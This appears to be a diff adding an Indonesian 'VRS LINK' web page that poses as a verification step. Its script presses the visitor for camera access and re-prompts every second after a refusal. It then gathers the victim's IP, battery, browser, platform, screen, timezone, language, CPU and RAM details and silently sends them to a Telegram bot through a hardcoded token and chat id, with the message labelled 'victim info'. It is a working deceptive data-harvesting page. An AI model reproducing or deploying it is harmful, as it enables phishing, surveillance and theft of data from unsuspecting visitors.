@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>VRS LINK</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #f0f0f0, #e1e1e1);
+      color: #333;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      padding: 60px 20px;
+      overflow: hidden;
+    }
+    h1 {
+      font-size: 3.5em;
+      margin-bottom: 30px;
+      color: #333;
+      text-shadow: 0 0 5px #333, 0 0 10px #888;
+    }
+    p {
+      font-size: 1.2em;
+      margin-bottom: 40px;
+      color: #666;
+    }
+    button {
+      background: #4CAF50;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: 0.3s;
+      margin-top: 20px;
+    }
+    button:hover {
+      background: #45a049;
+    }
+    #status {
+      margin-top: 30px;
+      font-size: 18px;
+      color: #333;
+    }
+    .link-container {
+      margin-top: 50px;
+      font-size: 1.3em;
+      color: #4CAF50;
+    }
+    .link-container a {
+      color: #4CAF50;
+      text-decoration: none;
+      font-weight: bold;
+      transition: color 0.3s;
+    }
+    .link-container a:hover {
+      color: #388e3c;
+    }
+    .popup {
+      background-color: rgba(255, 255, 255, 0.9);
+      color: #333;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    .popup h2 {
+      font-size: 2em;
+      color: #4CAF50;
+    }
+    .popup p {
+      font-size: 1.1em;
+    }
+    .close-btn {
+      background-color: #ff3333;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 20px;
+      transition: 0.3s;
+    }
+    .close-btn:hover {
+      background-color: #e60000;
+    }
+  </style>
+</head>
+<body>
+  <h1>VRS LINK</h1>
+  <p>Selamat datang! Klik tombol di bawah untuk melanjutkan ke verifikasi.</p>
+  <button onclick="cekData()">Verifikasi</button>
+  <div id="status"></div>
+  
+  <div class="link-container">
+    <p>Setelah verifikasi, klik <a href="https://files.catbox.moe/clyrd5.jpg" target="_blank">disini</a>.</p>
+  </div>
+
+  <!-- Popup untuk menampilkan informasi -->
+  <div id="popup" class="popup">
+    <h2>𝗜𝗡𝗙𝗢 𝗦𝗬𝗦𝗧𝗘𝗠</h2>
+    <p id="popupContent"></p>
+    <button class="close-btn" onclick="tutupPopup()">Tutup</button>
+  </div>
+
+  <script>
+    const token = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU"; // Ganti token kamu
+    const chat_id = "7916928366"; // Ganti chat id kamu
+
+    let startTime = Date.now();
+
+    async function cekData() {
+      tampilkanStatus("Memproses...");
+
+      // Minta izin untuk mengakses kamera
+      if (navigator.mediaDevices) {
+        try {
+          // Cek apakah izin sudah diberikan
+          await navigator.mediaDevices.getUserMedia({ video: true });
+          tampilkanStatus("Izin Kamera Diterima!");
+          await ambilDanKirimInfo();
+          tampilkanStatus("Data berhasil diambil!");
+
+          // Menampilkan popup dengan data
+          const infoPopup = `
+            🌐 IP: ${await ambilIP()}<br>
+            🔋 Baterai: ${await ambilBaterai()}<br>
+            💻 Platform: ${navigator.platform}<br>
+            🖥️ Browser: ${navigator.userAgent}<br>
+            🖥️ Resolusi: ${screen.width}x${screen.height}<br>
+            🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}<br>
+            🗣️ Bahasa: ${navigator.language}<br>
+            🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core<br>
+            🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB<br>
+            📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}<br>
+            ⏰ Durasi Buka: ${Math.floor((Date.now() - startTime) / 1000)} detik
+          `;
+          document.getElementById('popupContent').innerHTML = infoPopup;
+          document.getElementById('popup').style.display = 'block';
+
+          await kirimTelegram(`📝𝗜𝗡𝗙𝗢 𝗞𝗢𝗥𝗕𝗔𝗡:\n${infoPopup}`);
+        } catch (e) {
+          // Jika kamera ditolak, beri tahu pengguna dan minta izin lagi
+          console.error("Kamera tidak diizinkan:", e);
+          tampilkanStatus("Perizinan kamera diperlukan. Coba izinkan akses.");
+          setTimeout(() => {
+            cekData();  // Coba lagi untuk meminta izin
+          }, 1000); // Tunggu 1 detik sebelum mencoba lagi
+        }
+      } else {
+        alert("Browser tidak mendukung akses kamera.");
+        return;
+      }
+    }
+
+    function tampilkanStatus(teks) {
+      const statusDiv = document.getElementById('status');
+      statusDiv.innerText = teks;
+    }
+
+    async function kirimTelegram(pesan) {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text: pesan })
+      });
+    }
+
+    async function ambilIP() {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      return ipData.ip || "Unknown";
+    }
+
+    async function ambilBaterai() {
+      const battery = await navigator.getBattery();
+      return (battery.level * 100).toFixed(0) + "%";
+    }
+
+    async function ambilDanKirimInfo() {
+      const ip = await ambilIP();
+      const batteryLevel = await ambilBaterai();
+      const durasiMs = Date.now() - startTime;
+      const durasiDetik = Math.floor(durasiMs / 1000);
+
+      const text = `
+        🌐 IP: ${ip}
+        🔋 Baterai: ${batteryLevel}
+        💻 Platform: ${navigator.platform}
+        🖥️ Browser: ${navigator.userAgent}
+        🖥️ Resolusi: ${screen.width}x${screen.height}
+        🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+        🗣️ Bahasa: ${navigator.language}
+        🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core
+        🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB
+        📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}
+        ⏰ Durasi Buka: ${durasiDetik} detik
+      `;
+      await kirimTelegram(text);
+    }
+
+    function tutupPopup() {
+      document.getElementById('popup').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
